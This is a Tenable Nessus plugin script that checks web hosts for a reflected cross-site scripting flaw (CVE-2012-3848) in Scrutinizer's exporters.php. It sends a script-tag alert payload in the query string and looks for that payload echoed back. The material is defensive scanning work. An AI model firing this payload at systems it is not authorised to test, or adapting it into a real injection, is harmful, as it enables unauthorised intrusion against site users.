#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61649);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/01/15 03:38:17 $");

  script_cve_id("CVE-2012-3848");
  script_bugtraq_id(54725);
  script_osvdb_id(84321);

  script_name(english:"Scrutinizer < 9.5.2 exporters.php XSS");
  script_summary(english:"Tries to exploit a cross-site scripting vulnerability");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is running a web application that is affected by a
cross-site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running a version of Scrutinizer that is affected by
a cross-site scripting vulnerability in the 'd4d/exporters.php' web
console script.  The application does not properly sanitize the HTTP
Referrer field or URL parameters. 

A remote attacker could exploit this by tricking a user into
requesting a maliciously crafted URL."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt");
  script_set_attribute(attribute:"solution", value:"Upgrade to Scrutinizer 9.5.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dell:sonicwall_scrutinizer");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("scrutinizer_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/scrutinizer_netflow_sflow_analyzer");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

appname = 'Scrutinizer Netflow & sFlow Analyzer';
install = get_install_from_kb(appname:'scrutinizer_netflow_sflow_analyzer', port:port, exit_on_fail:TRUE);
dir = install['dir'];
app_url = build_url(qs:dir, port:port);

cgi = '/d4d/exporters.php';
xss = "<script>alert('" + SCRIPT_NAME + "')</script>";
expected_output = xss + '</a>';

vulnerable = test_cgi_xss(
  port:port,
  dirs:make_list(dir),
  cgi:cgi,
  qs:xss,
  pass_str:expected_output,
  ctrl_re:'Plixer Template Name'
);

if (!vulnerable) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, app_url);
